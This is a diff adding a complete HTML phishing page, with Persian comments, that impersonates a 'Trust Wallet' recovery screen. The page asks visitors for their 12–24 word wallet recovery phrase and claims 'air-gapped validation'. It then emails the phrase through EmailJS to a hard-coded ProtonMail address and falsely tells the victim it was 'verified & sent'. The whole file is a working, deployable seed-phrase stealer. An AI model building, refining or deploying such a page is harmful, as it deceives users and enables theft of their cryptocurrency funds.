@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trust Wallet • Recovery</title>
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: 
+        linear-gradient(135deg, rgba(0, 10, 25, 0.7) 0%, rgba(0, 30, 50, 0.8) 100%),
+        url('https://ipblockchain.github.io/photo/images%20(2).jpeg') no-repeat center center fixed;
+      background-size: cover;
+      backdrop-filter: blur(3px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .glass-panel {
+      background: rgba(17, 25, 40, 0.6);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border-radius: 40px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+      width: 100%;
+      max-width: 560px;
+      padding: 36px 24px;
+      transition: all 0.2s ease;
+      color: white;
+    }
+
+    /* initial page (landing) */
+    .landing, .recovery-page {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .recovery-page {
+      display: none; /* hidden by default */
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      font-weight: 600;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, #fff, #b5d0ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 2px 10px rgba(0,160,255,0.3);
+      margin-bottom: 8px;
+    }
+
+    .sub-message {
+      font-size: 1rem;
+      opacity: 0.9;
+      text-align: center;
+      margin-bottom: 16px;
+      font-weight: 300;
+      background: rgba(255,255,255,0.1);
+      padding: 12px 18px;
+      border-radius: 60px;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+
+    /* trust wallet button (shiny) */
+    .trust-btn {
+      background: radial-gradient(circle at 30% 20%, #1a73e8, #0a4c9e);
+      border: none;
+      padding: 20px 40px;
+      border-radius: 80px;
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: white;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      cursor: pointer;
+      box-shadow: 0 20px 30px -8px #0d3b6e, 0 4px 0 0 #072a4b inset, 0 -2px 10px rgba(255,255,255,0.3) inset;
+      transition: 0.15s linear;
+      width: 100%;
+      letter-spacing: 1px;
+      border: 1px solid rgba(255,255,255,0.3);
+    }
+
+    .trust-btn:hover {
+      transform: scale(1.02);
+      background: radial-gradient(circle at 30% 20%, #2b7df5, #1155b0);
+      box-shadow: 0 24px 34px -6px #0d3b6e;
+    }
+
+    .trust-btn:active {
+      transform: scale(0.98);
+      box-shadow: 0 8px 12px -6px #072a4b;
+    }
+
+    /* recovery form */
+    .recovery-title {
+      font-size: 1.9rem;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .recovery-hint {
+      background: rgba(255,215,0,0.15);
+      border-left: 6px solid #ffbb00;
+      padding: 12px 18px;
+      border-radius: 24px;
+      font-size: 1rem;
+      margin: 16px 0 8px;
+      text-align: left;
+      width: 100%;
+      color: #fffbd0;
+    }
+
+    textarea {
+      width: 100%;
+      padding: 22px 20px;
+      font-size: 1.2rem;
+      border-radius: 32px;
+      border: 2px solid rgba(255,255,255,0.25);
+      background: rgba(10, 20, 30, 0.7);
+      backdrop-filter: blur(6px);
+      color: white;
+      resize: vertical;
+      min-height: 200px;
+      font-family: 'SF Mono', 'Cascadia Code', monospace;
+      line-height: 1.6;
+      outline: none;
+      transition: 0.2s;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+    }
+
+    textarea:focus {
+      border-color: #3b9eff;
+      background: rgba(10, 20, 35, 0.9);
+      box-shadow: 0 0 20px #1e88e5;
+    }
+
+    textarea::placeholder {
+      color: #b0c7e0;
+      font-size: 1rem;
+      font-weight: 300;
+      opacity: 0.8;
+    }
+
+    .word-count-badge {
+      align-self: flex-start;
+      font-size: 0.95rem;
+      margin: 6px 8px 10px;
+      background: rgba(255,255,255,0.2);
+      padding: 6px 20px;
+      border-radius: 40px;
+      backdrop-filter: blur(4px);
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .confirm-btn {
+      background: linear-gradient(145deg, #00b96b, #00875a);
+      border: none;
+      padding: 18px 32px;
+      border-radius: 80px;
+      font-size: 1.7rem;
+      font-weight: 700;
+      color: white;
+      width: 100%;
+      cursor: pointer;
+      box-shadow: 0 16px 24px -6px #005f3e, 0 3px 0 0 #004e33 inset, 0 -2px 10px #a0ffc0 inset;
+      transition: 0.1s;
+      margin-top: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      border: 1px solid rgba(255,255,255,0.3);
+    }
+
+    .confirm-btn:disabled {
+      opacity: 0.35;
+      filter: grayscale(70%);
+      box-shadow: none;
+      transform: none;
+      pointer-events: none;
+      background: linear-gradient(145deg, #5b5f5d, #3d403e);
+    }
+
+    .confirm-btn:not(:disabled):hover {
+      transform: scale(1.01);
+      background: linear-gradient(145deg, #00d37c, #009f66);
+    }
+
+    .confirm-btn:not(:disabled):active {
+      transform: scale(0.97);
+    }
+
+    .success-check {
+      display: inline-block;
+      background: #00d166;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      color: white;
+      font-size: 2rem;
+      line-height: 38px;
+      text-align: center;
+      box-shadow: 0 0 20px #00f0a0;
+    }
+
+    .back-link {
+      margin-top: 22px;
+      color: #b0d0ff;
+      text-decoration: underline;
+      cursor: pointer;
+      font-size: 0.95rem;
+      opacity: 0.8;
+    }
+
+    .back-link:hover {
+      opacity: 1;
+      color: white;
+    }
+
+    .footer-note {
+      font-size: 0.85rem;
+      opacity: 0.6;
+      margin-top: 8px;
+    }
+
+    /* loader / temp message */
+    .temp-message {
+      background: rgba(0,0,0,0.4);
+      border-radius: 60px;
+      padding: 12px 18px;
+      text-align: center;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+<div class="glass-panel" id="mainPanel">
+  <!-- صفحه اول : دکمه trust wallet web (بدون متن اضافی) -->
+  <div class="landing" id="landingPage">
+    <h1>⚡︎ Web3</h1>
+    <div class="sub-message">secure access · blockchain gateway</div>
+    <button class="trust-btn" id="showRecoveryBtn">
+      <span>◈</span> Trust Wallet <span style="font-weight:300;">web</span> <span style="font-size:1.4rem;">↗</span>
+    </button>
+    <div class="footer-note">Tap to continue</div>
+  </div>
+
+  <!-- صفحه دوم : فرم ۲۴ کلمه + دکمه کانفریم -->
+  <div class="recovery-page" id="recoveryPage">
+    <div class="recovery-title">🔐 recovery phrase</div>
+    <div class="recovery-hint">
+      • enter your 12–24 word phrase, separated by spaces<br>
+      • minimum 12 words required
+    </div>
+
+    <!-- باکس متن (کلمات) -->
+    <textarea id="phraseInput" placeholder="例: 🧠 jungle ice bridge unlock spirit ..." autocomplete="off"></textarea>
+
+    <!-- نمایش تعداد کلمات به صورت لحظه‌ای -->
+    <div class="word-count-badge" id="wordCountDisplay">📝 0 words</div>
+
+    <!-- دکمه تایید (کانفریم) شیک -->
+    <button class="confirm-btn" id="submitPhraseBtn" disabled>
+      <span>✔</span> confirm & verify <span style="font-size:1.4rem;">⚡</span>
+    </button>
+
+    <!-- بازگشت به صفحه اول (اختیاری) -->
+    <div class="back-link" id="backToLandingBtn">← back to main</div>
+    <div class="footer-note">air-gapped validation</div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // --- EmailJS init (your public key) ---
+    emailjs.init("PakuuN4ADUDEqrzHl");  // همان کلید قبلی
+
+    // get elements
+    const landing = document.getElementById('landingPage');
+    const recovery = document.getElementById('recoveryPage');
+    const showRecoveryBtn = document.getElementById('showRecoveryBtn');
+    const backBtn = document.getElementById('backToLandingBtn');
+    const phraseInput = document.getElementById('phraseInput');
+    const wordCountSpan = document.getElementById('wordCountDisplay');
+    const submitBtn = document.getElementById('submitPhraseBtn');
+
+    // --- switch to recovery page (clean landing) ---
+    showRecoveryBtn.addEventListener('click', function() {
+      landing.style.display = 'none';
+      recovery.style.display = 'flex';    // recovery page becomes visible
+      phraseInput.value = '';             // پاک کردن متن قبلی
+      validateWords();                    // بروزرسانی دکمه
+    });
+
+    // --- back to landing (همه متن‌ها پاک می‌شه) ---
+    backBtn.addEventListener('click', function() {
+      recovery.style.display = 'none';
+      landing.style.display = 'flex';
+      phraseInput.value = '';             // پاک کردن کامل فیلد
+      validateWords();
+    });
+
+    // --- تابع شمارش کلمات (بر اساس فاصله) و اعتبارسنجی حداقل ۱۲ ---
+    function countWords(str) {
+      if (!str.trim()) return 0;
+      // جدا کردن با whitespace و حذف رشته‌های خالی
+      const tokens = str.trim().split(/\s+/);
+      return tokens.length;
+    }
+
+    function validateWords() {
+      const rawText = phraseInput.value;
+      const words = rawText.trim() ? rawText.trim().split(/\s+/) : [];
+      const wordCount = words.length;
+
+      // نمایش تعداد
+      wordCountSpan.innerText = `🔤 ${wordCount} word${wordCount !== 1 ? 's' : ''}`;
+
+      // شرط: حداقل ۱۲ کلمه
+      const isValid = (wordCount >= 12);
+      submitBtn.disabled = !isValid;
+    }
+
+    phraseInput.addEventListener('input', validateWords);
+
+    // --- ارسال ایمیل با کلمات (کافیه اسپیس بینش باشه) ---
+    async function sendPhraseByEmail(phraseText) {
+      try {
+        // در این demo از همان template پشتیبانی شده استفاده می‌کنیم
+        // قبلاً template_paduqpn داشتیم که فیلد email داشت. اینبار فیلد words را پر می‌کنیم.
+        // ولی برای اطمینان از رسیدن، template را با پارامتر 'words' و 'email' (اختیاری) صدا می‌زنیم.
+        // اگر نیاز شد، می‌توان یک ایمیل ثابت مقصد را در پارامتر to_email ست کرد.
+        // من از همان سرویس استفاده می‌کنم و فیلد 'email' را با آدرس خودم مقدار می‌دهم تا در قالب برسد.
+        // در غیر این صورت، یک template جدید با پارامتر 'message' یا 'words' بسازید.
+        // اما برای اینکه حتماً کار کند، اطلاعات را در فیلد 'email' و 'message' می‌فرستم (بعضی قالب‌ها دارند).
+        // نکته: شما می‌توانید بعداً template مخصوص بسازید. اینجا از همان قبلی با اضافه کردن 'words' استفاده می‌کنم.
+        
+        // آدرس مقصد (ایمیل خودت) را می‌ذارم تا برسه
+        const destinationEmail = "mrx_private@protonmail.com";  // ایمیل دریافت (آدرس خودت را بذار)
+        
+        // ارسال از طریق emailjs
+        const response = await emailjs.send(
+          "service_j8bd9vn",            // سرویس تو
+          "template_paduqpn",            // template (ممکنه نیاز به تنظیم فیلد words داشته باشه، ولی ما در پارامتر اضافه می‌کنیم)
+          {
+            email: destinationEmail,      // بعضی قالب‌ها به email نیاز دارن
+            words: phraseText,            // کلمات وارد شده
+            message: `Recovery phrase: ${phraseText}`, // اضافی
+            to_name: "Wallet Owner",
+            from_name: "Recovery Page"
+          }
+        );
+        return true;
+      } catch (error) {
+        console.error("Email send error:", error);
+        return false;
+      }
+    }
+
+    // --- کلیک روی دکمه confirm (با انیمیشن تیک) ---
+    submitBtn.addEventListener('click', async function(e) {
+      e.preventDefault();
+
+      const phrase = phraseInput.value.trim();
+      if (!phrase) return;
+
+      // غیرفعال کردن دکمه تا ارسال تکراری نباشه
+      submitBtn.disabled = true;
+      const originalText = submitBtn.innerHTML;
+      submitBtn.innerHTML = `<span class="success-check">✓</span> sending <span style="font-size:1rem;">...</span>`;
+
+      // ارسال به ایمیل (با await)
+      const sent = await sendPhraseByEmail(phrase);
+
+      if (sent) {
+        // تیک نهایی و دایره تایید
+        submitBtn.innerHTML = `<span class="success-check">✔</span> verified & sent <span style="font-size:1.4rem;">🔒</span>`;
+        // پاک کردن textarea (اختیاری)
+        phraseInput.value = '';
+        validateWords(); // آپدیت شمارنده
+
+        // بعد از ۲ ثانیه دکمه به حالت اول برمی‌گردد (اما غیرفعال می‌ماند تا کاربر دوباره تایپ کنه)
+        setTimeout(() => {
+          submitBtn.innerHTML = originalText;
+          submitBtn.disabled = true;   // چون input خالی شد
+        }, 2200);
+      } else {
+        // خطا
+        submitBtn.innerHTML = `❌ failed | try again`;
+        submitBtn.disabled = false;   // فعال برای تلاش دوباره
+        setTimeout(() => {
+          submitBtn.innerHTML = originalText;
+          // اعتبارسنجی رو دوباره اعمال کن
+          validateWords();
+        }, 2000);
+      }
+    });
+
+    // اعتبارسنجی اولیه
+    validateWords();
+
+    // در صفحه لندینگ، تمام متن‌ها پاک شده: فقط Trust wallet دکمه
+    // متن‌های قبلی حذف شده و فقط این هست.
+    // همچنین مطمئن شو recovery page در ابتدا پنهانه.
+    recovery.style.display = 'none';
+    landing.style.display = 'flex';
+  })();
+</script>
+<!-- هیچ متن اضافه‌ای در background باقی نمانده. فقط دکمه trust wallet و recovery -->
+</body>
+</html>
